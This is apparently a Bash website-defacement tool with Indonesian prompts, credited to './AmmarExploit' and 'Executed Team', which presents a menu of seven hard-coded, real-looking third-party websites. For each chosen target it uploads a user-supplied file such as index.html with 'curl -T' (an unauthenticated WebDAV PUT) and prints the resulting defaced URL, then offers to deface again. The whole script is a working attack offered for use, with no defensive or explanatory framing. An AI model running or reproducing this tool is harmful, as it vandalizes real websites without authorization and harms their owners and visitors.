blue="\033[34;1m"
green="\033[32;1m"
purple="\033[35;1m"
cyan="\033[36;1m"
red="\033[31;1m"
putih="\033[97;1m"
kuning="\033[93;1m"
pa="http://uzingela.co.za"
pu="http://happy.mikikk.co.jp"
pe="http://urbanwater.co.za"
pt="http://mariongeiger.com"
pk="http://invitationstation.co.za"
pl="http://spinnaker-ims.com"
i="http://lwlcon.co.za"

#Buat Tanya Login Lagi Apa Enggak
menu() {
read -p "Mau Deface Lagi? (y/n): " lgi
if [ $lgi = y ] || [ $lgi = Y ]
then
bash deface.sh
fi
if [ $lgi = n ] || [ $lgi = N ]
then
exit
fi
}
banner(){
clear 
echo -e $purple"              ["$cyan"Powered By Executed Team"$purple"]"$putih 
echo -e "██████╗ ███████╗███████╗ █████╗  ██████╗███████╗██████╗ " 
echo -e "██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗" 
echo -e "██║  ██║█████╗  █████╗  ███████║██║     █████╗  ██████╔╝" 
echo -e "██║  ██║██╔══╝  ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗" 
echo -e "██████╔╝███████╗██║     ██║  ██║╚██████╗███████╗██║  ██║" 
echo -e $red"╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝"$putih 
echo -e $red"   •"$kuning"•"$green"•"$putih" Created By ./AmmarExploit (WebDav Tools) "$green"•"$kuning"•"$red"•"$putih 
echo
}
banner
echo -e '['$green'•'$putih'] 1. http://uzingela.co.za' 
echo -e "["$green"•"$putih"] 2. "$pu
echo -e "["$green"•"$putih"] 3. "$pe
echo -e "["$green"•"$putih"] 4. "$pt
echo -e "["$green"•"$putih"] 5. "$pk
echo -e "["$green"•"$putih"] 6. "$pl
echo -e "["$green"•"$putih"] 7. "$i
echo -e "["$green"•"$putih"] 8. Create File HTML" 
echo -e "["$red"•"$putih"] 9. Exit"
echo 
read -p "Input Menu: " Next;  
if [ $Next = 1 ] || [ $Next = satu ];then 
echo 
echo -e $putih'['$kuning'!'$putih'] Script Harus Berada Di sdcard' 
echo -e $putih'['$kuning'+'$putih'] Contoh '$red':'$green' index.html'$putih
read -p "[+] Input File: " sc; 
curl -T $sc $pa 
echo -e $putih'['$green'•'$putih'] '$putih'Terdeface => '$purple $pa/$sc 
menu
fi
if [ $Next = 2 ] || [ $Next = dua ];then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T $sc $pu 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'Terdeface => '$purple $pu/$sc 
menu 
fi
if [ $Next = 3 ] || [ $Next = tiga ];then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T $sc $pe 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'Terdeface => '$purple $pe/$sc 
menu
fi
if [ $Next = 4 ] || [ $Next = empat ];then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T $sc $pt 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'Terdeface => '$purple $pt/$sc 
menu
fi
if [ $Next = 5 ] || [ $Next = lima ];then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T $sc $pk 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'Terdeface => '$purple $pk/$sc 
menu
fi
if [ $Next = 6 ] || [ $Next = enam ];then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T $sc $pl 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'Terdeface => '$purple $pl/$sc 
menu
fi
if [ $Next = 7 ] || [ $Next = tujuh ];then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T $sc $i 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'Terdeface => '$purple $i/$sc 
menu
fi
if [ $Next = 8 ] || [ $Next = delapan ];then 
bash html.sh
menu
fi
if [ $Next = 9 ] || [ $Next = exit ];then
echo -e $putih'['$kuning'•'$putih'] '$cyan'System '$putih'exit detexted'
exit
fi
